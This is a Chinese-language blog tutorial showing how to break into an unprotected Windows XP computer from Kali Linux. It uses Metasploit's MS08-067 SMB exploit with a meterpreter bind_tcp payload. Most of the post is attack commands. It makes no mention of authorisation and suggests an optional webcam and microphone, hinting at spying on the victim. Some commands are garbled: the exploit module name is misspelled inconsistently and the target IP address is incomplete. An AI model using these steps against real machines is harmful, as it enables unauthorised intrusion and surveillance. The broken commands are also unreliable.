---
layout: post
title: 用kali来黑掉windows
tags: windows linux 教程
keywords: windows linux kali 教程 黑
categoty: tech
cover: 'https://www.kali.org/wp-content/uploads/2019/02/kali-release-2019-600x284.png'
---
### 前言
哈喽大家好。我有好久没更新博客了。  
在这段时间里，我变得非常黑。因为我在为kali做准备。  
前一段时间，我的电脑移到其他地方去了，然后我去插那边的网线，结果插上是插上了，响灯也想了，电脑上也写着连接了，有因特访问。可是，我进百度却进半天都没进去，竟然还连接超时，7456。  
然后有人看了，说是我电脑的问题，叫我装双系统。Okay，这就是我最近在为kali做准备的原因。  
  
### 准备材料
- Kali电脑一部
- 没装防火墙和360卫士或防火墙不稳定的电脑一部*这里我用xp*
  - (可选)摄像头
  - (可选)麦克风

### 01.开启Metasploit
Metasploit是一个安全渗透软件。Kali可以在终端*root*里输入:  
```bash
msfconsole
```
来打开它。
![]({{ site.imgbed }/kalihack/01.png)

### 02. 搜索Xp漏洞
也正是msf是一个安全渗透软件，所以我们可以查看漏洞。输入:
```msf
search platform:windows
```
或者是
```msf
search netapi
```
来搜索。  
之后，你会看到有一个`ms08-netapi`的漏洞，利用等级是`great`。  
使用`info *内容名*`可以来查看该内容的详细解说。
![]({{ site.imgbed }}/kalihack/02.png)

### 03.使用ms08漏洞并设置
使用该内容，输入:
```msf
use exploit/windows/smb/ms08_067netapi
```
然后你会发现提示符旁边多了个`exploit(windows/smb/ms08_067-netapi)`的东西，表示使用成功。  
我们输入:
```msf
set payload windows/meterpreter/bind_tcp
```
设置载荷。  
另外，我们要攻击Xp主机，需要先提前知道Xp的IP地址。知道后，回到你的kali前，输入:
```msf
set RHOST 192.1.104
```
这里是设定控制主机的ip地址，RHOST可以说是全写Remote Host。  
做完这些后，你就可以开始hack了！输入
```msf
exploit
```
